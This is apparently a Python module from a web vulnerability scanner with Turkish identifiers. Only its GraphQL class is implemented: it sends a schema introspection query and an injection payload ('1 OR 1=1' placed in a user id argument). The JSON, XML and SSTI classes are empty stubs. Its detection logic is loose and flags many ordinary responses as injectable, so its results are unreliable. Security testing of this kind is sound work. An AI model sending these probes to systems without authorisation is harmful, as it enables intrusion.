"""VIRELOX JSON/XML/GraphQL/SSTI Injection v4.0"""


class _Base:
    def __init__(self, http, log=None, plog=None):
        self.http = http
        self.log = log or (lambda m: None)
        self.plog = plog or self.log

    def test(self, url, param, post_data=None):
        return {"basarili": False}


class JSONInjection(_Base):
    pass


class XMLInjection(_Base):
    pass


class GraphQLInjection(_Base):
    def graphql_enjeksiyonu(self, url, http_istemci):
        """
        Try GraphQL introspection and injection.
        Returns {"basarili": bool, "introspection_acik": bool, "bulgular": list}
        """
        bulgular = []
        introspection_acik = False
        basarili = False

        headers = {"Content-Type": "application/json"}

        # Step 1: Introspection query
        try:
            yanit = http_istemci.post(
                url,
                json={"query": "{__schema{types{name}}}"},
                headers=headers,
                timeout=10,
            )
            metin = yanit.text if hasattr(yanit, "text") else ""
            if "__schema" in metin or "QueryType" in metin or "types" in metin:
                introspection_acik = True
                basarili = True
                bulgular.append({
                    "tip": "introspection",
                    "detay": "GraphQL introspection etkin — şema açığa çıkıyor",
                    "onem": "ORTA",
                })
        except Exception as e:
            self.log(f"GraphQL introspection hatası: {e}")

        # Step 2: Injection attempt
        try:
            yanit2 = http_istemci.post(
                url,
                json={"query": '{user(id:"1 OR 1=1"){id email}}'},
                headers=headers,
                timeout=10,
            )
            metin2 = yanit2.text if hasattr(yanit2, "text") else ""
            if (
                "email" in metin2.lower()
                or "error" not in metin2.lower()
                and yanit2.status_code == 200
                and len(metin2) > 20
            ):
                basarili = True
                bulgular.append({
                    "tip": "graphql_injection",
                    "detay": f"Olası GraphQL injection — yanıt: {metin2[:120]}",
                    "onem": "YÜKSEK",
                })
        except Exception as e:
            self.log(f"GraphQL injection hatası: {e}")

        return {
            "basarili": basarili,
            "introspection_acik": introspection_acik,
            "bulgular": bulgular,
        }

    def test(self, url, param, post_data=None):
        return self.graphql_enjeksiyonu(url, self.http)


class SSTIInjection(_Base):
    pass
